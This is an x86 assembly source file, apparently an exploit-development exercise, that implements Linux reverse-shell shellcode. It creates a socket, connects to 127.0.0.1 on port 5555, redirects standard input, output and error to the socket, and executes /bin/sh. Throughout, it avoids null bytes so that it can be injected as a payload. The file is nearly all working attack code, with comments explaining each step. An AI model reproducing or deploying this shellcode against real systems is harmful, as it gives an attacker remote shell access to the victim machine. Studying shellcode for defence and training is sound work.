; Filename: reverse_shell.nasm
; Author:  Dave Sully
; Website:  http://suls.co.uk
;
; Purpose: Reverse shell in x86 assembly 

global _start			

section .text
_start:

	; Clear everthing we are using 
	xor eax, eax 
	xor ebx, ebx 
	xor ecx, ecx 
	xor edx, edx 
	xor esi, esi
	xor edi, edi

	; Define structure for socket 
	; push 0x0100007f ; Push IP to stack in reverse byte order ; need to revist the null bytes here  (127.0.0.1)
	; We have a issue here in that the ip address 127.0.0.1 = 0x0100007f in hex which contains null bytes 
	; Easiest way around this is to XOR the value with 0xffffffff
	mov edi, 0xfeffff80 ; xor of 0x0100007f and 0xffffffff
	xor edi, 0xffffffff
	push edi
	push word 0xb315 ; Push 5555 to the stack in reverse byte order 5555 in hex = 0x15b3 
	push word 0x2 ; push 2  to the stack (AF-INET) 

	; Create socket 
	; s = socket(AF_INET, SOCK_STREAM, 0)
	mov ax, 0x167 ; Syscall 359 (socket)
	mov bl, 0x2 ; AF-INET (2) 
	mov cl, 0x1 ; Sock stream (1) 
	; dl should already be zero 
	int 0x80 ; call system interupt to create socket 
	xchg esi, eax ; socket file descriptor now stored in esi 

	; Connect socket 
	; connect(s, (struct sockaddr *)&addr, sizeof(addr));
	mov ax, 0x16a ; Syscall 362 connect 
	mov ebx, esi ; Move socket file descriptor into ebx 
	mov ecx, esp ; Point ecx to the top of the stack which has our address structure on it 
	mov dl, 0x10 ; Size of structure (16)
	int 0x80 ; call system interupt to create connect 

	; Dup input output and error file descriptors 
	; dup2(s, 0); // Dup2 sycall = 63  
	xor eax, eax ; Clear eax 
	mov ebx, esi ; move socket id to ebx 
	xor ecx, ecx ; Clear ecx 
	mov cl, 0x2 ; set ecx to 2 
loop:
	mov al, 0x3f ; syscall 63 
	int 0x80 ; call dup 2 
	dec ecx  ; decrease ecx by 1 
	jns loop ; jump if not signed back to loop, this should cycle 2,1,0

	; Execute Shell 
	; execve("/bin/sh",0 ,0); // Execve syscall = 11
	; (const char *filename, char *const argv[], char *const envp[]);
	xor eax,eax ; null eax 
	mov al, 0xb ; syscall 11 into eax
	xor ebx, ebx ; zero ebx 
	push ebx ; push a null string to the stack to terminate our string 
	push 0x68732f2f ; hs//
	push 0x6e69622f ; nib/
	mov ebx, esp ; point ebx at the stack
	xor ecx, ecx ; clear ecx and edx as they are used in the syscall 
	xor edx, edx
	int 0x80 

section .data



